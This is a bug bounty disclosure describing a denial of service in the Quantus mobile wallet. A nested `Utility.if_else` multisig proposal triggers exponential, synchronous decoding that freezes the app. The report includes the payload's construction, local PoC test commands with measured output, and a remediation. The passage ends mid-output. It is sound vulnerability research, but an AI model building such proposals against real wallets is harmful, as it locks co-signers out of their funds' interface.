# 88348 w a high exponential synchronous decoding of a 213 byte utility if else proposal leaves the mobile wallet unable to render a frame or accept input whenever the affected multisig account loads

**Submitted on Aug 12th 2026 at 20:14:15 UTC by @skydev for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88348
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Taking down the application/website

## Description

## Brief/Intro

The Quantus SDK describes `Utility.if_else` by recursively describing its `main` branch twice: once for the displayed primary call and again for the propagated summary. An affected row stops the application while its indexer response is being parsed. If that initial parse returns, the later authoritative-storage enrichment decodes the same call again. Repeating that valid wrapper 42 times produces a 213-byte call with only 85 runtime nodes, but the source recurrence requires `13,194,139,533,310` recursive `describe` invocations. The mobile application automatically obtains authoritative stored calls and performs this conversion while loading an active multisig account, blocking the application isolate. Because the active account is persisted and restored, normal startup re-enters the same conversion after an ordinary force-close and restart. A bounded test using the unmodified production decoder does not return before its two-second watchdog; the test then terminates the isolated worker for cleanup. Equal-size linear nesting completes in under one millisecond in the representative output below, and a second test proves that the exact bytes fit the runtime limits and are stored by an ordinary 2-of-2 multisig.

## Vulnerability Details

<details open>

<summary>Root cause: one branch is converted twice at every level</summary>

`CallDecoder.decodeBytes` strictly SCALE-decodes the input and then synchronously calls `describe`. In the `Utility.if_else` arm, `describe(main)` is evaluated once to build the `Primary call` field and a second time to obtain `summary`. The first result is not reused:

```dart
static DecodedCall decodeBytes(List<int> bytes) {
  final input = Input.fromBytes(Uint8List.fromList(bytes));
  final call = runtime.RuntimeCall.codec.decode(input);
  final remaining = input.remainingLength ?? 0;
  if (remaining != 0) {
    throw FormatException('$remaining trailing bytes after nested call');
  }
  return describe(call);
}

// ...

case utility.IfElse(:final main, :final fallback):
  return DecodedCall(
    pallet: 'Utility',
    call: 'if_else',
    fields: [
      NestedCallField('Primary call', describe(main)),
      NestedCallField('Fallback call', describe(fallback)),
    ],
    summary: describe(main).summary,
  );
```

This is not the recursion inherent in walking a nested call. It is duplicate conversion of the same immutable `main` object at every level, including reconstruction of its complete descendant tree.

Four other wrappers in the same file take the result into a local and reuse it — `as_derivative` at `:547`, `with_weight` at `:562`, `dispatch_as` at `:599` and `Recovery` at `:614` each read `final inner = describe(call);`. `if_else` is the only arm that calls `describe` twice on the same operand, at `:577` for the field and again at `:580` for the summary.

</details>

<details open>

<summary>The encoded call grows linearly while conversion work grows exponentially</summary>

Let `R` be an empty `System.remark`, and define `F(0) = R` and `F(n) = Utility.if_else(main: F(n-1), fallback: R)`. Counting the root invocation, `D(0) = 1` and the decoder follows:

```
D(n) = 1 + 2*D(n-1) + D(0)
     = 2*D(n-1) + 2
     = 3*2^n - 2
```

Each additional layer adds only the two call discriminants and one three-byte empty fallback, so the SCALE size is `3 + 5n`. The real runtime tree has `2n + 1` nodes.

| Shape                           | SCALE bytes | Runtime nodes | Source-derived required `describe` invocations |                        Representative clean test result |
| ------------------------------- | ----------: | ------------: | ---------------------------------------------: | ------------------------------------------------------: |
| depth-42, nesting in `fallback` |         213 |            85 |                                            127 |                                     completed in 784 us |
| depth-16, nesting in `main`     |          83 |            33 |                                        196,606 |                                  completed in 32,970 us |
| depth-42, nesting in `main`     |         213 |            85 |                         **13,194,139,533,310** |  did not return before 2,000 ms; test terminated worker |
| depth-100, nesting in `main`    |         503 |           201 |  **3,802,951,800,684,688,204,490,109,616,126** | did not return before 30,000 ms; test terminated worker |

Both `main`-nested rows are stored on chain by the runtime test at those exact byte lengths. The equal-size depth-42 fallback case is the negative control: it passes through the same SCALE codec and the same `CallDecoder.decodeBytes`, but the duplicated `main` is always the leaf, so the recurrence stays linear at `3n + 1`. Wall-clock values are machine-dependent; the structural counts and encoded sizes are deterministic.

The two `main`-nested depths answer different questions. Depth 42 is the conservative case: at 213 bytes it is 2.080% of the runtime's call-size limit, 0.582% of the `ref_time` component of its inner-weight limit and 11.222% of the `proof_size` component, so nothing about it is near an edge. Depth 100 answers whether the state is a delay that a user could sit out — 2,568,584,264,161,081 years at the fastest rate measured settles that — and it too stays inside every gate, at 4.912% of the byte limit, 1.386% of `ref_time` and 26.718% of `proof_size`. Both payloads are accepted and stored by the runtime test.

The worker isolate exists only to keep the regression test bounded and to confirm cleanup. The mobile production path invokes the same synchronous function on its normal application isolate without a traversal budget, cancellation point, timeout, cache or background worker.

</details>

<details open>

<summary>The mobile application invokes the decoder automatically for an active multisig</summary>

The condition does not require opening a proposal detail sheet. `HomeScreen` mounts `MultisigActivitySection` whenever the selected account is a multisig. That section immediately watches `multisigOpenProposalsProvider`, which calls `MultisigService.getOpenProposals`. Each row returned by the indexer is parsed first, and an affected row does not get past that step.

If the parse returns, the service then replaces the indexer bytes with the authoritative call stored in `Multisig.Proposals` and executes `withBytes.decodedCall?.summary`. The `decodedCall` getter calls `CallDecoder.decodeBytes`, so this is a second synchronous conversion of the same call, still before any row is rendered:

```dart
final stored = await Future.wait(open.map((p) => queries.proposals(multisigId, p.id)));

// ...

final withBytes = p.copyWith(callRaw: call);
final summary = withBytes.decodedCall?.summary;
return withBytes.copyWith(recipient: summary?.recipient ?? '', amount: summary?.amount ?? BigInt.zero);
```

The application persists the complete active `DisplayAccount` in `_activeDisplayAccountKey`. `ActiveAccountNotifier` reloads it during construction, and `HomeScreen` mounts the multisig activity section again. An ordinary force-close therefore does not change the selected account or remove the stored proposal; normal startup reaches the same synchronous conversion again after the open-proposal query completes.

</details>

<details open>

<summary>Both payloads are valid, inexpensive runtime proposals</summary>

The supporting runtime regression independently constructs the depth-42 bytes using the call indices — `RuntimeCall::Utility = 9`, `Utility::if_else = 6`, and empty `System.remark = 00 00 00` — and also constructs the same call through typed Rust variants. It asserts byte equality, exact decode, no trailing data and byte-for-byte round-trip. A second case does the same at depth 100. Both compare their payload against the runtime's call-size and inner-weight limits.

```
depth=42 bytes=213 runtime_nodes=85 projected_client_visits=13194139533310 call_weight=Weight { ref_time: 5821982000, proof_size: 294168 } max_inner_weight=Weight { ref_time: 1000000000000, proof_size: 2621440 } max_call_size=10240 stored_status=ProposalStatus::Active
test transactions::c76_if_else_runtime::tests::depth_42_if_else_is_a_storable_normal_multisig_call ... ok

depth=100 bytes=503 call_weight=Weight { ref_time: 13859100000, proof_size: 700400 } max_inner_weight=Weight { ref_time: 1000000000000, proof_size: 2621440 } max_call_size=10240
depth=100 stored_status=ProposalStatus::Active
test transactions::c76_if_else_runtime::tests::depth_100_if_else_is_also_a_storable_normal_multisig_call ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 42 filtered out
```

Neither payload is near a limit:

|           | `ref_time` | `proof_size` |  bytes |
| --------- | ---------: | -----------: | -----: |
| depth 42  |     0.582% |      11.222% | 2.080% |
| depth 100 |     1.386% |      26.718% | 4.912% |

`proof_size` is the strictest of the three, and even the depth-100 payload uses just over a quarter of it. For each case the regression creates an ordinary 2-of-2 multisig, submits the exact bytes through `Multisig::propose` — which applies those gates itself — and reads the same bytes back with status `Active`. No malformed SCALE, oversized payload, invalid call, modified endpoint or repeated request is involved.

The SDK's generated metadata predates the chain as a whole, but that does not create an assumption here: the Dart test asserts the exact encodings, and the independent runtime test decodes and stores those same call indices and bytes.

</details>

### Expected and observed behavior

**Expected:** A call accepted within the runtime's size and weight limits should have a bounded conversion cost. Recursive review should visit each decoded node once, or reject a call before synchronous work can make the application unavailable.

**Observed:** The conversion cost depends on where identical nesting is placed. A valid 213-byte call with 85 runtime nodes expands to more than 13 trillion synchronous conversions and does not return before the bounded two-second observation ends; the 503-byte depth-100 call expands to 3.8e30 and does not return before thirty seconds. The equal-size fallback-nested control completes in under one millisecond on the same path.

### Affected sources

* Mobile application and SDK: `d5fc4d6572ebc2244e95009a33f5da5048935867`
* Supporting chain: `3b243b870a5442a6e5f443056f67bbba87d472f5`
* Primary scoped asset: `https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app`
* The affected decoder is supplied by the separately listed `quantus_sdk` asset at the same commit.

### Public-review boundary

Public [PR #585](https://github.com/Quantus-Network/quantus-apps/pull/585) introduced `CallDecoder` and describes recursive nested-call display. Public [PR #586](https://github.com/Quantus-Network/quantus-apps/pull/586) describes recursive rendering and the outer 8 KiB cold-wallet payload cap; the same approved branch was remerged to main through [PR #588](https://github.com/Quantus-Network/quantus-apps/pull/588). Public [PR #575](https://github.com/Quantus-Network/quantus-apps/pull/575) addresses a different integrity issue: binding multisig review to authoritative on-chain bytes instead of indexer presentation. None of those materials identifies the repeated `describe(main)`, its recurrence, a traversal budget, or this availability result. No exact report or fix was located in the supplied V12, Eiger and project-review corpus.

### Remediation

Decode `main` and `fallback` once and reuse both results:

```dart
final mainDecoded = describe(main);
final fallbackDecoded = describe(fallback);
return DecodedCall(
  pallet: 'Utility',
  call: 'if_else',
  fields: [
    NestedCallField('Primary call', mainDecoded),
    NestedCallField('Fallback call', fallbackDecoded),
  ],
  summary: mainDecoded.summary,
);
```

The local fix removes this exponential recurrence, but the boundary should also be explicit: enforce aggregate depth/node/field/render-byte limits, cache one `DecodedCall` per immutable `callRaw`, avoid decoding the same proposal in both service mapping and widgets, and perform bounded conversion away from the application isolate with cancellation. Regression tests should compare equal-size `main`-nested and `fallback`-nested calls and assert linear visit counts.

## Impact Details

**Impact: Websites and Applications — Critical — "Taking down the application/website".**

**What a co-signer is entitled to do.** The pallet grants a registered signer three things: submit a proposal (`pallets/multisig/src/lib.rs:535`), approve one (`:740`), and execute it once the threshold is met (`:1068`). Proposing and approving are individual acts; moving the multisig's funds is not, because execution needs the threshold.

Submitting one proposal — which needs no approval from anyone — is enough to stop the wallet of any signer who has that multisig as their active account. They enable no setting, confirm nothing, review nothing and sign nothing; the only thing they do is launch the application.

**What "the application" means here.** The input is a valid item of chain state that the runtime accepts and that each client fetches on its own initiative when the account loads. Every wallet instance that has the affected multisig as its active account reaches the same conversion independently, on its own device, with no further action by the attacker. While the synchronous conversion runs, the UI isolate stops servicing further frames and input.

The computation does not complete on any relevant timescale. A single stored depth-100 proposal projects to 2,568,584,264,161,081 years at the fastest measured rate, and that payload is not an edge case: `Multisig::propose` accepts it and stores it with status `Active`, at 4.912% of `MaxCallSize`, 1.386% of the `ref_time` component of `MaxInnerCallWeight` and 26.718% of its `proof_size` component. Nor does the attacker depend on a single proposal. `MaxTotalProposalsInStorage` is 200 per multisig with a per-signer share of `200 / signers` (`pallets/multisig/src/lib.rs:564-581`, `runtime/src/configs/mod.rs:647`), so a signer of a two-signer multisig may hold up to 100 active proposals where one suffices, and may replace each as it expires at the cost of an ordinary transaction.

One active, valid on-chain proposal is sufficient to make the affected mobile-wallet instance stop servicing its event loop when the relevant multisig account loads.

While the conversion runs, nothing in the application is reachable — not only the affected multisig's screens.

The conversion is synchronous and runs on the isolate that draws the interface. The chain from the screen to the decode carries no boundary that could move it elsewhere:

| Step                                                                                                                                    | Source                                                | Form                                          |
| --------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------- | --------------------------------------------- |
| Home mounts the section for the active account                                                                                          | `mobile-app/lib/v2/screens/home/home_screen.dart:224` | widget build                                  |
| The section watches open proposals                                                                                                      | `multisig_activity_section.dart:25-108`               | provider watch                                |
| The service requests open proposals from the indexer                                                                                    | `multisig_service.dart:225-232`                       | `async`                                       |
| **Each returned row is parsed, and a row with no transfer columns but a `call_raw` is decoded during that parse**                       | **`multisig_proposal.dart:109-111`**                  | **synchronous — the first point that blocks** |
| If parsing returns, the service replaces the call data with the authoritative bytes from chain storage and reads the decoded call again | `multisig_service.dart:293-325`, `:319`               | synchronous `.map()`                          |
| A rendered row reads it a third time                                                                                                    | `proposal_row.dart:72`                                | property read                                 |
| The model decodes on every read                                                                                                         | `multisig_proposal.dart:146-148`                      | plain getter, no `async`, no cache            |
| The decoder walks the call tree                                                                                                         | `call_decoder.dart:63`                                | synchronous `switch`                          |

The row must be listed by the project's GraphQL indexer to reach any of this, which is ordinary behaviour for an ordinary proposal. What is not obvious is how early the conversion happens: `MultisigProposal.fromIndexerJson` decodes `call_raw` itself when the row carries no transfer amount and no recipient, and the `Utility.if_else` proposal row used by the PoC satisfies that condition. The conversion therefore begins while the indexer's response is still being parsed, before the proposal row renders and before the authoritative-storage step that would decode the same call again.

```dart
if (parsedAmount == BigInt.zero && recipient.isEmpty && callRaw != null) {
  final summary = _decodeCall(callRaw)?.summary;
```

Each later reader decodes again: `decodedCall` is an uncached getter, so nothing is reused.

The application and SDK sources — `mobile-app/lib` and `quantus_sdk/lib` — contain no `compute()`, `Isolate.run` or `BackgroundIsolate` call. The one `Isolate.spawn` under those trees is in `human_readable_checksum_service.dart:43` and belongs to address-checksum generation. (`quantus_sdk/rust_builder/cargokit` carries an unrelated `CrateHash.compute` used at build time.) A blocked UI isolate in Flutter renders no frame and dispatches no input, so while the conversion runs the account switcher at `accounts_screen.dart:426` cannot be operated either, and the user's other accounts are equally unreachable through this client. The input is small and cheap by every measure the chain applies to it. The runtime test reports the depth-42 call at 0.582% of the `ref_time` component of `MaxInnerCallWeight`, 11.222% of its `proof_size` component, and 2.080% of `MaxCallSize`. It is a well-formed call accepted under the ordinary limits, fetched by the application's ordinary open-proposal flow, and it is a single stored state item rather than sustained traffic, repeated requests or malformed input.

### Conditions

1. The proposing party is already one registered signer of an ordinary multisig that the affected user also tracks. This is normal multisig authority, not access to project infrastructure.
2. That signer submits a valid nested `Utility.if_else` call as an active proposal and pays the ordinary proposal fee and deposit. The PoC demonstrates depth 42 at 213 bytes and depth 100 at 503 bytes; either is accepted, and one proposal is enough.
3. That multisig is the affected user's active account. For a signer who uses it this is the resting state rather than an action: the active account is persisted in shared preferences and restored during provider construction (`settings_service.dart:173-193`, `account_providers.dart:63-98`). Selecting it, or following the normal proposal-notification flow, reaches the same state.
4. When the application loads open proposals, it converts the call synchronously while parsing the indexer's response. If that parse returns, the authoritative-storage step converts the same call again.

No approval, execution or movement of funds is needed.

This report is about an ordinary multisig, which is what `Multisig::create_multisig` produces and what the application's create flow builds. High security is a separate opt-in living in a different pallet, entered by an explicit `ReversibleTransfers::set_high_security` call that also nominates a guardian and a reversibility delay (`pallets/reversible-transfers/src/lib.rs:375-380`). An account already in that mode is not reachable by this exact shape, because the whitelist gating its proposals does not admit an outer `Utility.if_else`.

### What the evidence establishes

The observations compose:

1. The runtime accepts and stores both payloads. The runtime test proposes them into an ordinary 2-of-2 multisig and reads them back with `ProposalStatus::Active`.
2. The application's own response handling does not survive one such row. `MultisigProposal.fromIndexerJson`, given an `ACTIVE` row carrying the relevant selected fields the factory uses, parses a depth-16 row normally and does not finish parsing either the depth-42 or the depth-100 row.
3. That work is synchronous on the isolate that draws the interface, through the chain tabulated above, with no `compute()`, `Isolate.run` or comparable boundary in either asset's source.
4. The cost doubles per nesting level. Measured over seven converged depths, three samples each, the fitted slope is 0.9998 against a predicted 1.0 with r² = 0.999988, at 21.3–21.6 ns per traversal.
5. At the fastest of those rates, a depth-100 row needs 2,568,584,264,161,081 years — about 186,000 times the age of the universe — and that rate was measured on desktop hardware, not a phone.

When the application loads the affected multisig as its active account, the synchronous conversion prevents the UI isolate from servicing further frames or input. An ordinary force-close and relaunch restores the same active account and repeats the conversion.

<details>

<summary>Additional impact selection considerations</summary>

**Against the named out-of-scope entries.** The Websites-and-Apps exclusions that sit nearest to this finding are quoted below with the reason each does not reach it.

| Exclusion, verbatim                                                                                                             | Why it does not apply                                                                                                                                                                                                                                                                                                                                                                   |
| ------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| *"Theoretical impacts without any proof or demonstration"*                                                                      | Three local layers execute production code. `CallDecoder.decodeBytes` is run directly at depths 16–24 with the growth fitted from the measurements, at depth 42 under a two-second bound and at depth 100 under a thirty-second bound; `MultisigProposal.fromIndexerJson` is run on an `ACTIVE` indexer row; and the runtime stores both payloads and returns `ProposalStatus::Active`. |
| *"Impacts caused by vulnerabilities requiring un-prompted, in-app user actions that are not part of the normal app workflows"*  | No in-app action is required. The conversion runs while the account's open proposals load. Viewing a multisig's pending proposals is the ordinary workflow, and the active account is restored from storage on launch.                                                                                                                                                                  |
| *"Impacts that only require DDoS"*                                                                                              | One stored proposal of 503 bytes, submitted once, at ordinary transaction cost. There is no traffic volume, no repetition and no request rate involved; the payload is a well-formed call inside every runtime limit.                                                                                                                                                                   |
| *"UX and UI impacts that do not materially disrupt use of the platform"*                                                        | Once loading reaches the synchronous conversion, the UI isolate stops servicing further frames and input, and relaunching re-enters the same conversion. That is the disruption the exclusion carves out.                                                                                                                                                                               |
| *"UI/UX best practice recommendations"*                                                                                         | The report identifies one arm of one function that converts the same operand twice where its four siblings hoist it, and measures the consequence. The remediation is that one change.                                                                                                                                                                                                  |
| *"Impacts involving attacks requiring physical access to the victim device"* and *"…access to the local network of the victim"* | Neither. The input reaches the device through the chain and the project's ordinary indexer.                                                                                                                                                                                                                                                                                             |
| *"Actions by privileged actors within their privileges"*                                                                        | A registered signer's privilege in a threshold scheme is to propose and to co-sign. Rendering another signer's wallet unusable is not among those privileges, and the affected user need not be a party to the proposal beyond tracking the multisig.                                                                                                                                   |

**On what the affected user must do.** Nothing beyond launching the application. No proposal-specific approval, confirmation, signature or interaction is required, and no non-default setting is involved. The single precondition is that the proposer holds ordinary signer authority in a multisig the user also tracks.

</details>

### Persistence and recovery bounds

The selected multisig is stored in shared preferences and restored during provider construction, so force-closing the application and reopening it restores the same active account and enters the same conversion again. Only the proposer may cancel the proposal before expiry (`pallets/multisig/src/lib.rs:840`); the proposer chooses the expiry, up to the runtime's `100,800`-block maximum.

The conversion is already wrapped in a catch-all (`multisig_proposal.dart:268-274`), so a decoding *failure* is handled: the proposal renders with a null decoded call and the screen continues. That guard does not apply here, because nothing is thrown. A deep but linear nesting would exhaust the stack — the 10,240-byte limit admits depth 2,047 at 5 bytes per level — and that `StackOverflowError` would be caught like any other. Neither payload here goes near that: recursion depth equals nesting depth, so the two shapes descend 42 and 100 frames. The cost is in the branching, not the depth, and branching throws nothing — it simply does not return.

The PoC executes the production converter directly and bounds each observation — two seconds at depth 42, thirty at depth 100. Neither returns. The recurrence puts depth 42 at more than 13 trillion `describe` invocations and depth 100 at 3.8e30, while the production path runs the same synchronous converter on the application isolate with no traversal budget, timeout or cancellation. The report does not depend on a particular Android/iOS watchdog duration or process-termination policy.

## References

* [Strict byte decoding enters the synchronous conversion path](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L45-L64)
* [`Utility.if_else` describes `main` twice](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/chain/call_decoder.dart#L538-L581)
* [Home mounts multisig activity for the active account](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/home/home_screen.dart#L198-L232)
* [Multisig activity automatically watches open proposals](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/multisig/multisig_activity_section.dart#L25-L108)
* [`getOpenProposals` routes open rows through authoritative-call enrichment](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/multisig_service.dart#L225-L232)
* [The authoritative-call replacement invokes `decodedCall`](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/multisig_service.dart#L293-L325)
* [`MultisigProposal.fromIndexerJson` decodes `call_raw` during response parsing](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/models/multisig_proposal.dart#L97-L140)
* [`MultisigProposal.decodedCall` invokes the production decoder](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/models/multisig_proposal.dart#L142-L149)
* [The active display account is persisted and restored](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/quantus_sdk/lib/src/services/settings_service.dart#L173-L193)
* [The active-account provider restores persisted state during construction](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/providers/account_providers.dart#L63-L98)
* [The proposal-notification flow selects the owning multisig and opens the proposal](https://github.com/immunefi-team/audit-comp-quantus-apps/blob/d5fc4d6572ebc2244e95009a33f5da5048935867/mobile-app/lib/v2/screens/home/home_screen.dart#L154-L177)
* [Frozen runtime `Utility.if_else`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/utility/src/lib.rs#L540-L580)
* [Frozen runtime multisig size, expiry and inner-weight limits](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L643-L657)
* [Frozen runtime high-security call whitelist](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L660-L715)
* [`Multisig::propose` stores a bounded runtime call](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L535-L698)
* [Pre-expiry cancellation is restricted to the proposer](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L832-L892)
* [Any signer may remove an expired proposal](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/multisig/src/lib.rs#L894-L963)
* [PR #585 — introduction of authoritative recursive call display](https://github.com/Quantus-Network/quantus-apps/pull/585)
* [PR #586 — recursive parameter rendering and outer payload cap](https://github.com/Quantus-Network/quantus-apps/pull/586)
* [PR #588 — remerge of the approved #586 branch to main](https://github.com/Quantus-Network/quantus-apps/pull/588)
* [PR #575 — authoritative-call integrity remediation, merged 2026-07-28](https://github.com/Quantus-Network/quantus-apps/pull/575)

## Link to Proof of Concept

<https://gist.github.com/Skydev0h/2b0d75a86a271cddcfd16a2dffcae38a>

## Proof of Concept

## Proof of Concept

This PoC has three local layers joined by the same call shape. The first runs the production `CallDecoder` in a bounded worker so the test suite can observe non-completion and clean up safely. The second runs `MultisigProposal.fromIndexerJson` — the factory the application uses on the indexer's response — on an `ACTIVE` row carrying the relevant selected fields the factory uses. The third proves that the exact bytes are accepted, weighed and stored by the runtime as an ordinary active multisig proposal. No layer contacts a live node, indexer, account, device or project service.

### Artifacts

The five reproduction files are in this unlisted Gist:

<https://gist.github.com/Skydev0h/2b0d75a86a271cddcfd16a2dffcae38a>

| File                    | Purpose                                                                      |
| ----------------------- | ---------------------------------------------------------------------------- |
| `poc_test.dart`         | Frozen SDK bounded decoder regression and equal-size controls                |
| `runtime-harness.patch` | Directly applicable chain test patch                                         |
| `runtime_test.rs`       | Standalone copy of the Rust test added by the patch                          |
| `scaling_test.dart`     | Measured depth sweep, the exponential fit, and the depth-100 acceptance case |
| `indexer_row_test.dart` | The production SDK factory on one indexer-shaped row                         |

### Step 1: reproduce the bounded client observation

A Flutter SDK is required; the repository does not vendor one. The result below was reproduced with Flutter 3.44.9 stable. From a clean directory:

```sh
git clone https://github.com/immunefi-team/audit-comp-quantus-apps c76-app
cd c76-app
git -c advice.detachedHead=false checkout d5fc4d6572ebc2244e95009a33f5da5048935867

git clone https://gist.github.com/Skydev0h/2b0d75a86a271cddcfd16a2dffcae38a c76-poc
cp c76-poc/poc_test.dart quantus_sdk/test/c76_poc_test.dart

cd quantus_sdk
flutter pub get
timeout 120s flutter test --no-pub test/c76_poc_test.dart --reporter expanded
flutter analyze --no-pub test/c76_poc_test.dart --fatal-infos

# Supporting measurement, run from the same clone (~4 minutes). It backs the
# depth projection and the depth-100 acceptance case shown further below.
cp ../c76-poc/scaling_test.dart test/c76_scaling_test.dart
timeout 1200s flutter test --no-pub test/c76_scaling_test.dart --reporter expanded
```

Observed output:

```
C76 linear control: depth=42 bytes=213 traversals=127 completed_in=784us
C76 bounded main control: depth=16 bytes=83 traversals=196606 completed_in=32970us
C76 bounded observation: depth=42 bytes=213 traversals=13194139533310 watchdog=2000ms result=timeout worker=terminated
00:02 +4: All tests passed!

Analyzing c76_poc_test.dart...
No issues found!
```

The output is one representative run; wall-clock values vary by host, and this block takes a single sample per case where the sweep below takes the median of three. The first test constructs both depth-42 calls through the project's generated `RuntimeCall` types and asserts their exact canonical encodings and equal 213-byte length. The second and third tests are controls through the same production decoder: equal-size fallback nesting and smaller depth-16 main nesting both complete, while the source recurrence projects 127 and 196,606 invocations respectively. The final test starts its two-second watchdog only after the worker reports that it has entered, observes that the depth-42 main nesting has not returned, terminates the worker in `finally`, and waits for `onExit` to confirm cleanup.

The worker changes only containment: it calls the unmodified production `CallDecoder.decodeBytes`. The application itself calls that synchronous function on its normal isolate and has no equivalent timeout or cancellation.

### Step 2: reproduce the production indexer-row path

`poc_test.dart` calls `CallDecoder.decodeBytes` directly. `indexer_row_test.dart` instead runs `MultisigProposal.fromIndexerJson` — the SDK factory the application uses to turn one GraphQL row into a proposal — on an `ACTIVE` row carrying the relevant selected fields the factory uses, with no `transfer_amount`, no `transferTo`, and `call_raw` holding the stored bytes.

From the same `quantus_sdk` directory as Step 1:

```sh
cp ../c76-poc/indexer_row_test.dart test/c76_indexer_row_test.dart
timeout 300s flutter test --no-pub test/c76_indexer_row_test.dart --reporter expanded
```

Observed output:

```
C76 indexer row: depth=16 hex_chars=168 result=parsed pallet=Utility call=if_else status=active
C76 indexer row: depth=42 hex_chars=428 watchdog=10s result=did-not-complete worker=terminated
C76 indexer row: depth=100 hex_chars=1008 watchdog=30s result=did-not-complete worker=terminated
```

The depth-16 control returns a parsed proposal with `pallet=Utility`, `call=if_else` and `status=active`, so the row is one the factory accepts. The depth-42 and depth-100 rows, identical in every field except the nesting depth, do not finish parsing. This is the application's own response-handling path rather than the decoder in isolation, and it blocks before the proposal row renders and before the authoritative-storage step that would decode the same call again.

### Step 3: reproduce runtime acceptance and storage

A Rust toolchain and the repository's normal native build dependencies are required. The first build may take several minutes. From a clean directory:

```sh
git clone https://github.com/immunefi-team/audit-comp-quantus-chain c76-chain
cd c76-chain
git -c advice.detachedHead=false checkout 3b243b870a5442a6e5f443056f67bbba87d472f5

git clone https://gist.github.com/Skydev0h/2b0d75a86a271cddcfd16a2dffcae38a c76-poc
git apply c76-poc/runtime-harness.patch

cargo test -p quantus-runtime transactions::c76_if_else_runtime -- --nocapture
```

Observed output:

```
depth=42 bytes=213 runtime_nodes=85 projected_client_visits=13194139533310 call_weight=Weight { ref_time: 5821982000, proof_size: 294168 } max_inner_weight=Weight { ref_time: 1000000000000, proof_size: 2621440 } max_call_size=10240 stored_status=ProposalStatus::Active
test transactions::c76_if_else_runtime::tests::depth_42_if_else_is_a_storable_normal_multisig_call ... ok

depth=100 bytes=503 call_weight=Weight { ref_time: 13859100000, proof_size: 700400 } max_inner_weight=Weight { ref_time: 1000000000000, proof_size: 2621440 } max_call_size=10240
depth=100 stored_status=ProposalStatus::Active
test transactions::c76_if_else_runtime::tests::depth_100_if_else_is_also_a_storable_normal_multisig_call ... ok

test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 42 filtered out
```

The second case stores the depth-100 call that the client-side argument relies on. `Multisig::propose` applies the size and weight gates itself, so its returning `Ok` and the proposal reading back as `Active` is the acceptance: 503 bytes against a `MaxCallSize` of 10,240, and a call weight of 1.386% and 26.718% of the two `MaxInnerCallWeight` components.

The runtime test independently constructs the SCALE fixture and the typed Rust call, then verifies:

1. Both encodings are exactly 213 bytes and byte-for-byte equal.
2. Frozen `RuntimeCall::decode` consumes the full input and round-trips unchanged.
3. The decoded shape contains exactly 42 `Utility.if_else` nodes and 43 empty `System.remark` nodes.
4. Its weight is below `MaxInnerCallWeight`, and its bytes are below `MaxCallSize`.
5. A normal 2-of-2 multisig accepts the exact bounded bytes through `Multisig::propose`.
6. The storage entry contains the same bytes, the proposing signer's first approval and status `Active`.

This layer uses local `TestExternalities` and direct signed origins. It does not start a node or use private keys.

### How the cost scales with depth

`scaling_test.dart` sweeps depths 16 to 24 through the same production converter and fits the growth rather than assuming it. Each depth is measured three times and the median is used, because a single sample on a loaded machine moves the fitted slope by several percent. The fit starts at depth 18, below which the first sample still carries JIT compilation.

```
C76 scaling: depth=16 bytes=83 traversals=196606 median_of_3=4376us per_traversal=22.3ns samples=4313,4376,13279
C76 scaling: depth=17 bytes=88 traversals=393214 median_of_3=8466us per_traversal=21.5ns samples=8309,8466,17738
C76 scaling: depth=18 bytes=93 traversals=786430 median_of_3=16848us per_traversal=21.4ns samples=16495,16848,16912
C76 scaling: depth=19 bytes=98 traversals=1572862 median_of_3=33514us per_traversal=21.3ns samples=33335,33514,34264
C76 scaling: depth=20 bytes=103 traversals=3145726 median_of_3=67388us per_traversal=21.4ns samples=67078,67388,67779
C76 scaling: depth=21 bytes=108 traversals=6291454 median_of_3=136102us per_traversal=21.6ns samples=135813,136102,140001
C76 scaling: depth=22 bytes=113 traversals=12582910 median_of_3=269969us per_traversal=21.5ns samples=267785,269969,273010
